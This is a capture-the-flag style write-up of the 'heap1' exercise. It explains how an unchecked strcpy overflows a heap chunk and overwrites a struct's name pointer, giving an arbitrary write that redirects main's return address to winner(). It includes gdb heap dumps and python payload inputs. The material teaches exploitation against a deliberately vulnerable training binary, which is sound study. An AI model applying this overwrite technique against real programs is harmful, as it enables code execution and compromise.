Before diving into heap1 it is important to understand what we have to work with. Looking at the source code it is clear that much like in heap0 we need to call the function winner to read the flag.

```c
void winner()
{
  char buffer[64];
  FILE *fp;

  printf("and we have a winner @ %d\n", time(NULL));

  fp = fopen("./flag.txt", "r");

  fgets(buffer, 64, (FILE*)fp);
  printf("flag: %s\n", buffer);
}
```
Of course looking at main, there is no direct way to call winner like there was in heap0.

```c
int main(int argc, char **argv)
{
  struct internet *i1, *i2, *i3;

  i1 = malloc(sizeof(struct internet));
  i1->priority = 1;
  i1->name = malloc(8);

  i2 = malloc(sizeof(struct internet));
  i2->priority = 2;
  i2->name = malloc(8);

  strcpy(i1->name, argv[1]);
  strcpy(i2->name, argv[2]);

  printf("and that's a wrap folks!\n");
}
```

What we do see in main is that some memory is being allocated on the heap. In total four items are malloc'd, two instances of the struct `internet` and two eight byte arrays. 

Lets break down exactly what is happening.

1. First the `internet` struct is malloc'd.

```c
struct internet {
  int priority;
  char *name;
};
```

```c
i1 = malloc(sizeof(struct internet));
```

This allocates at least eight bytes, four for the integer `priority` and another four to store the pointer to `name`.

2. Then the value of `priority` is set.

```c
i1->priority = 1;
```

3. Finally eight bytes are malloc'd, and the address of that chunk is stored in `name`.

```c
i1->name = malloc(8);
```

So what exactly does that look like in memory? I used the gef plugin for gdb to get a nice printout of the heap right after all four objects are malloc'd. 

```python
Chunk(addr=0x804b008, size=0x10, flags=PREV_INUSE)
    [0x0804b008     01 00 00 00 18 b0 04 08 00 00 00 00 11 00 00 00    ................]
Chunk(addr=0x804b018, size=0x10, flags=PREV_INUSE)
    [0x0804b018     00 00 00 00 00 00 00 00 00 00 00 00 11 00 00 00    ................]
Chunk(addr=0x804b028, size=0x10, flags=PREV_INUSE)
    [0x0804b028     02 00 00 00 38 b0 04 08 00 00 00 00 11 00 00 00    ....8...........]
Chunk(addr=0x804b038, size=0x10, flags=PREV_INUSE)
    [0x0804b038     00 00 00 00 00 00 00 00 00 00 00 00 c1 0f 02 00    ................]
Chunk(addr=0x804b048, size=0x20fc0, flags=PREV_INUSE)  ←  top chunk
```

There is a lot going on here so let's break it down by chunk.

```python
Chunk(addr=0x804b008, size=0x10, flags=PREV_INUSE)
    [0x0804b008     01 00 00 00 18 b0 04 08 00 00 00 00 11 00 00 00    ................]
```

This first chunk represents the first `internet` struct. It begins at address `0x804b008` and is sixteen bytes long. The first four bytes are the `priority` integer, and in this case it has been set to 1, `01 00 00 00`. The next four bytes, `18 b0 04 08`, is the pointer to `name`. Then there are eight extra bytes that store some metadata about the chunk, but that is not important and can be ignored.

```python
Chunk(addr=0x804b018, size=0x10, flags=PREV_INUSE)
    [0x0804b018     00 00 00 00 00 00 00 00 00 00 00 00 11 00 00 00    ................]
```

This second chunk stores the eight bytes that were malloc'd to store `name`. Notice that the address of this chunk is the same address that was stored in bytes five through eight of the previous chunk.

The remaining two chunks are structured the same as the first two, just with different values. 


After memory is allocated, the first two arguments to the program are copied into `name` using `strcopy`. Our exploit will rely on the fact that `strcopy` has no idea how many bytes to write and will readily overflow the buffer it is writing to.

```c
strcpy(i1->name, argv[1]);
strcpy(i2->name, argv[2]);
```

But for now lets read in some simple inputs and see what happens. In this case heap1 was given `aaaaaaaa` and `bbbbbbbb` as command line arguments. Looking at the heap after the calls to `strcpy` we can clearly see the strings we provided as series of 61's and 62's.

```python
Chunk(addr=0x804b008, size=0x10, flags=PREV_INUSE)
    [0x0804b008     01 00 00 00 18 b0 04 08 00 00 00 00 11 00 00 00    ................]
Chunk(addr=0x804b018, size=0x10, flags=PREV_INUSE)
    [0x0804b018     61 61 61 61 61 61 61 61 00 00 00 00 11 00 00 00    aaaaaaaa........]
Chunk(addr=0x804b028, size=0x10, flags=PREV_INUSE)
    [0x0804b028     02 00 00 00 38 b0 04 08 00 00 00 00 11 00 00 00    ....8...........]
Chunk(addr=0x804b038, size=0x10, flags=PREV_INUSE)
    [0x0804b038     62 62 62 62 62 62 62 62 00 00 00 00 c1 0f 02 00    bbbbbbbb........]
Chunk(addr=0x804b048, size=0x20fc0, flags=PREV_INUSE)  ←  top chunk
```

It is important to understand what exactly is happening when `strcopy` is called. 

```c
strcpy(i1->name, argv[1]);
```

The address `strcpy` will write to is stored in i1. In this case it is `0x0804b018`. `strcpy` will then start writing bytes beginning at that address.

Remember how `strcpy` will write as many bytes as you tell it to? Let's see what happens when we pass it more than sixteen bytes (the total size of chunk 2).

```python
Chunk(addr=0x804b008, size=0x10, flags=PREV_INUSE)
    [0x0804b008     01 00 00 00 18 b0 04 08 00 00 00 00 11 00 00 00    ................]
Chunk(addr=0x804b018, size=0x10, flags=PREV_INUSE)
    [0x0804b018     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa]
Chunk(addr=0x804b028, size=0x61616160, flags=PREV_INUSE)
    [0x0804b028     61 00 00 00 38 b0 04 08 00 00 00 00 11 00 00 00    a...8...........]
Chunk(addr=0x804b038, size=0x10, flags=PREV_INUSE)
    [0x0804b038     62 62 62 62 62 62 62 62 00 00 00 00 c1 0f 02 00    bbbbbbbb........]
Chunk(addr=0x804b048, size=0x20fc0, flags=PREV_INUSE)  ←  top chunk
```

The seventeenth `a` got written into the chunk for `i2`. If we wrote a few more bytes we could overwrite the address stored in `i2` to point anywhere we want. Then the second call to `strcpy` will write to that new address instead of writing into chunk 4 like it should. This gives us the power to write what ever we want, where ever we want.

As an example lets use `python -c "print 'a'*20 + '\x10\x10\x10\x10'"` as our input.
```python
Chunk(addr=0x804b008, size=0x10, flags=PREV_INUSE)
    [0x0804b008     01 00 00 00 18 b0 04 08 00 00 00 00 11 00 00 00    ................]
Chunk(addr=0x804b018, size=0x10, flags=PREV_INUSE)
    [0x0804b018     61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61    aaaaaaaaaaaaaaaa]
Chunk(addr=0x804b028, size=0x61616160, flags=PREV_INUSE)
    [0x0804b028     61 61 61 61 10 10 10 10 00 00 00 00 11 00 00 00    aaaa............]
```
Now the second call to `strcpy` will write our b's to address `0x10101010`.


If we know where the top of the stack is, we can now use this method to overwrite the return address so that when `main` exits, `winner` is called instead. We have used this technique several times already. Using gdb we can find out the address of `winner` is `0x804854b`. So we need to write that somewhere near the top of the stack. 

So our first arugment needs to overwrite the address stored in the second struct.
`python -c "print 'a'*20 + '\x??\x??\x??\x??'"`

And the second argument needs to be the address of `winner`.
`python -c "print '\x4b\x85\x04\x08'"`

(To make things a little easier you might want to write more than one copy of `0x804854b`.)
